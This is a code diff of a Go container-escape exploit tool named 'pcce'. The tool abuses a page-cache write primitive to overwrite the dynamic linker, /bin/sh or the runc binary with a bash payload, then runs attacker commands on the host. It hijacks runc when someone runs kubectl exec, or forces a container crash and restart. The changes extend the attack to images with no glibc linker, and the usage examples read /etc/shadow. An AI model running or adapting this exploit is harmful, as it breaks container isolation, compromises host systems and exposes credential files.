@@ -4,7 +4,6 @@ package main
 
 import (
 	"bytes"
-	"context"
 	_ "embed"
 	"fmt"
 	"os"
@@ -30,10 +29,21 @@ var linkerPaths = []string{
 	"/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",
 }
 
-// --- Copy Fail primitive ---
+// --- helpers ---
 
 func pageCacheWrite(path string, offset int64, content []byte) error {
 	return copyfail.Write(path, offset, content, copyfail.Write4)
+}
+
+// bashPayload wraps cmd in a bash shebang script.
+func bashPayload(cmd string) []byte {
+	return []byte("#!/bin/bash\n" + cmd + "\n")
+}
+
+// procArgv0 reads /proc/<pid>/cmdline and returns argv[0], empty string on error.
+func procArgv0(pid int) string {
+	cmdline, _ := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
+	return string(bytes.SplitN(cmdline, []byte{0}, 2)[0])
 }
 
 // --- Patch injector with payload ---
@@ -61,26 +71,63 @@ func patchInjector(payload []byte) ([]byte, error) {
 
 // --- Write injector to ld.so ---
 
-func writeInjector(payload []byte) error {
-	injector, err := patchInjector(payload)
-	if err != nil {
-		return err
-	}
+// ensureLinker checks each candidate ld.so path.
+// If a path exists but is too small, it is skipped.
+// If no path exists at all, it creates a zero-filled placeholder at the first
+// path that is writable — enabling restart mode on distroless / Alpine images
+// that ship no glibc dynamic linker.
+func ensureLinker(injectorSize int) (string, error) {
 	for _, target := range linkerPaths {
 		info, err := os.Stat(target)
 		if err != nil {
 			continue
 		}
-		if int64(len(injector)) > info.Size() {
-			return fmt.Errorf("injector (%d) exceeds %s size (%d)", len(injector), target, info.Size())
+		if info.Size() < int64(injectorSize) {
+			return "", fmt.Errorf("injector (%d) exceeds %s size (%d)", injectorSize, target, info.Size())
 		}
-		fmt.Printf("    [*] Target: %s (%d bytes -> %d bytes)\n", target, info.Size(), len(injector))
-		if err := pageCacheWrite(target, 0, injector); err != nil {
-			return err
-		}
-		return nil
+		return target, nil
 	}
-	return fmt.Errorf("no dynamic linker found")
+
+	// No ld.so found — try to create a zero-filled placeholder large enough for
+	// the injector. We write real zero bytes (not a sparse truncate) so that the
+	// page cache is fully populated and Copy Fail's splice can read back the
+	// entire file.
+	for _, target := range linkerPaths {
+		if err := os.MkdirAll(filepath.Dir(target), 0755); err != nil {
+			fmt.Printf("    [-] mkdir %s: %v\n", filepath.Dir(target), err)
+			continue
+		}
+		// O_TRUNC so a previous run's leftover file is reused rather than rejected.
+		f, err := os.OpenFile(target, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0755)
+		if err != nil {
+			fmt.Printf("    [-] create %s: %v\n", target, err)
+			continue
+		}
+		_, werr := f.Write(make([]byte, injectorSize))
+		f.Close()
+		if werr != nil {
+			fmt.Printf("    [-] write placeholder %s: %v\n", target, werr)
+			os.Remove(target)
+			continue
+		}
+		fmt.Printf("    [*] Created placeholder linker: %s (%d bytes)\n", target, injectorSize)
+		return target, nil
+	}
+	return "", fmt.Errorf("no dynamic linker found and could not create placeholder")
+}
+
+func writeInjector(payload []byte) error {
+	injector, err := patchInjector(payload)
+	if err != nil {
+		return err
+	}
+	target, err := ensureLinker(len(injector))
+	if err != nil {
+		return err
+	}
+	info, _ := os.Stat(target)
+	fmt.Printf("    [*] Target: %s (%d bytes -> %d bytes)\n", target, info.Size(), len(injector))
+	return pageCacheWrite(target, 0, injector)
 }
 
 // --- Write shebang to target file ---
@@ -91,10 +138,9 @@ func writeShebang(path string) error {
 }
 
 func resolveEntrypoint(pid int) string {
-	cmdline, _ := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
-	argv := bytes.Split(bytes.TrimRight(cmdline, "\x00"), []byte{0})
-	if len(argv) > 0 && len(argv[0]) > 0 && filepath.IsAbs(string(argv[0])) {
-		if resolved, err := filepath.EvalSymlinks(string(argv[0])); err == nil {
+	argv0 := procArgv0(pid)
+	if filepath.IsAbs(argv0) {
+		if resolved, err := filepath.EvalSymlinks(argv0); err == nil {
 			return resolved
 		}
 	}
@@ -103,7 +149,7 @@ func resolveEntrypoint(pid int) string {
 
 // --- Crash container ---
 
-func crashContainer(ctx context.Context, pid int) {
+func crashContainer(pid int) {
 	// Method 1: cgroup.kill (cgroup v2)
 	cgPath, _ := os.ReadFile(fmt.Sprintf("/proc/%d/cgroup", pid))
 	for _, line := range bytes.Split(cgPath, []byte("\n")) {
@@ -116,7 +162,7 @@ func crashContainer(ctx context.Context, pid int) {
 		}
 	}
 	// Method 2: kill all processes then exit
-	for i := 0; i < 10; i++ {
+	for range 10 {
 		syscall.Kill(-1, syscall.SIGKILL)
 		time.Sleep(100 * time.Millisecond)
 	}
@@ -125,26 +171,30 @@ func crashContainer(ctx context.Context, pid int) {
 
 // --- Process monitor: scan /proc for target process ---
 
-func isTargetProcess(pid int) bool {
-	exe, _ := os.Readlink(fmt.Sprintf("/proc/%d/exe", pid))
+// isTargetProcess reports whether pid looks like a runc process.
+// It also returns the /proc/<pid>/exe path so the caller can open it directly
+// without re-computing it.
+func isTargetProcess(pid int) (bool, string) {
+	exePath := fmt.Sprintf("/proc/%d/exe", pid)
+	exe, _ := os.Readlink(exePath)
 	base := filepath.Base(exe)
 	if base == "runc" || base == "docker-runc" {
-		return true
+		return true, exePath
 	}
+
 	cmdline, _ := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
 	cmd := string(cmdline)
-	// runc init process inside container PID ns
 	if strings.Contains(cmd, "runc") && strings.Contains(cmd, "init") {
-		return true
+		return true, exePath
 	}
 	if cmd == "/proc/self/exe\x00init\x00" {
-		return true
+		return true, exePath
 	}
-	argv0 := string(bytes.SplitN(cmdline, []byte{0}, 2)[0])
-	if filepath.Base(argv0) == "runc" || filepath.Base(argv0) == "docker-runc" {
-		return true
+	argv0 := strings.SplitN(cmd, "\x00", 2)[0]
+	if base := filepath.Base(argv0); base == "runc" || base == "docker-runc" {
+		return true, exePath
 	}
-	return false
+	return false, ""
 }
 
 func captureTargetFD(timeout time.Duration) (int, error) {
@@ -152,7 +202,16 @@ func captureTargetFD(timeout time.Duration) (int, error) {
 	if timeout > 0 {
 		deadline = time.Now().Add(timeout)
 	}
-	maxPID := currentMaxPID()
+
+	// Snapshot current max PID so we only watch newly spawned processes.
+	maxPID := 0
+	if entries, err := os.ReadDir("/proc"); err == nil {
+		for _, e := range entries {
+			if pid, err := strconv.Atoi(e.Name()); err == nil && pid > maxPID {
+				maxPID = pid
+			}
+		}
+	}
 
 	for {
 		if !deadline.IsZero() && time.Now().After(deadline) {
@@ -168,13 +227,13 @@ func captureTargetFD(timeout time.Duration) (int, error) {
 				continue
 			}
 			maxPID = pid
-			if !isTargetProcess(pid) {
+			ok, exePath := isTargetProcess(pid)
+			if !ok {
 				continue
 			}
-			// Found target, try to open its exe (may need retry)
-			path := fmt.Sprintf("/proc/%d/exe", pid)
+			// Found target — open its exe fd with retries.
 			for retry := 0; retry < 50; retry++ {
-				f, err := os.Open(path)
+				f, err := os.Open(exePath)
 				if err == nil {
 					fmt.Printf("    [+] Captured: pid=%d fd=%d\n", pid, int(f.Fd()))
 					return int(f.Fd()), nil
@@ -186,25 +245,12 @@ func captureTargetFD(timeout time.Duration) (int, error) {
 	}
 }
 
-func currentMaxPID() int {
-	entries, _ := os.ReadDir("/proc")
-	max := 0
-	for _, e := range entries {
-		if pid, err := strconv.Atoi(e.Name()); err == nil && pid > max {
-			max = pid
-		}
-	}
-	return max
-}
-
 // --- Exploit: exec mode ---
-// Overwrites /bin/sh with shebang, then waits for someone to `kubectl exec`
-// into the container. When runc appears, captures its fd and overwrites it.
 
 func exploitExec(cmd string, target string, timeout time.Duration) error {
-	payload := []byte(fmt.Sprintf("#!/bin/bash\n%s\n", cmd))
+	payload := bashPayload(cmd)
 
-	fmt.Println("")
+	fmt.Println()
 	fmt.Println("[*] Page Cache Container Escape (exec mode)")
 	fmt.Printf("[*] Payload: %s\n", cmd)
 	fmt.Printf("[*] Target: %s\n\n", target)
@@ -220,7 +266,7 @@ func exploitExec(cmd string, target string, timeout time.Duration) error {
 	}
 	fmt.Println("[+] Step 1: Done\n")
 
-	// Step 2: wait for target process to appear, capture fd, overwrite
+	// Step 2: wait for target process to appear, capture fd
 	fmt.Println("[*] Step 2: Waiting for target process (trigger with: kubectl exec <pod> -- <cmd>)...")
 	fd, err := captureTargetFD(timeout)
 	if err != nil {
@@ -228,6 +274,7 @@ func exploitExec(cmd string, target string, timeout time.Duration) error {
 	}
 	defer syscall.Close(fd)
 
+	// Step 3: overwrite runc binary via fd
 	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)
 	fmt.Printf("[*] Step 3: Overwriting target binary via %s...\n", fdPath)
 	if err := pageCacheWrite(fdPath, 0, payload); err != nil {
@@ -238,13 +285,11 @@ func exploitExec(cmd string, target string, timeout time.Duration) error {
 }
 
 // --- Exploit: restart mode ---
-// Overwrites ld.so + entrypoint, then crashes container.
-// On restart, injector captures fd and overwrites target from inside the loading chain.
 
 func exploitRestart(cmd string, pid int, timeout time.Duration) error {
-	payload := []byte(fmt.Sprintf("#!/bin/bash\n%s\n", cmd))
+	payload := bashPayload(cmd)
 
-	fmt.Println("")
+	fmt.Println()
 	fmt.Println("[*] Page Cache Container Escape (restart mode)")
 	fmt.Printf("[*] Payload: %s\n", cmd)
 	fmt.Printf("[*] PID: %d\n\n", pid)
@@ -263,9 +308,7 @@ func exploitRestart(cmd string, pid int, timeout time.Duration) error {
 	fmt.Println("[+] Step 2: Done\n")
 
 	fmt.Println("[*] Step 3: Triggering container crash...")
-	ctx, cancel := context.WithTimeout(context.Background(), timeout)
-	defer cancel()
-	crashContainer(ctx, pid)
+	crashContainer(pid)
 	fmt.Println("[+] Step 3: Done")
 	return nil
 }
@@ -273,11 +316,12 @@ func exploitRestart(cmd string, pid int, timeout time.Duration) error {
 // --- CLI ---
 
 func usage() {
-	fmt.Fprintf(os.Stderr, `Usage: pcce <mode> --cmd <command> [options]
+	fmt.Fprintf(os.Stderr, `Usage: pcce.bak <mode> --cmd <command> [options]
 
 Modes:
   exec      Overwrite exec target, wait for kubectl exec to capture target process
   restart   Overwrite ld.so + entrypoint, crash container, auto-exploit on restart
+            (creates a placeholder ld.so if none exists)
 
 Options:
   --cmd, -c <command>    Command to execute on host (required)
@@ -287,9 +331,9 @@ Options:
   --timeout <duration>   Timeout (default: 30s, 0=forever for exec mode)
 
 Examples:
-  pcce exec --cmd 'touch /tmp/pwned'
-  pcce exec --cmd 'cat /etc/shadow' --target /usr/bin/python3
-  pcce restart --cmd 'touch /tmp/pwned'
+  pcce.bak exec --cmd 'touch /tmp/pwned'
+  pcce.bak exec --cmd 'cat /etc/shadow' --target /usr/bin/python3
+  pcce.bak restart --cmd 'touch /tmp/pwned'
 `)
 }
 
@@ -299,7 +343,7 @@ func main() {
 		mode      string
 		target    = "/bin/sh"
 		pid       = 1
-		noRestore = false
+		noRestore bool
 		timeout   = 30 * time.Second
 	)
 
@@ -359,7 +403,7 @@ func main() {
 	switch mode {
 	case "exec":
 		if timeout == 30*time.Second {
-			timeout = 0 // exec mode default: wait forever
+			timeout = 0
 		}
 		err = exploitExec(cmd, target, timeout)
 	case "restart":
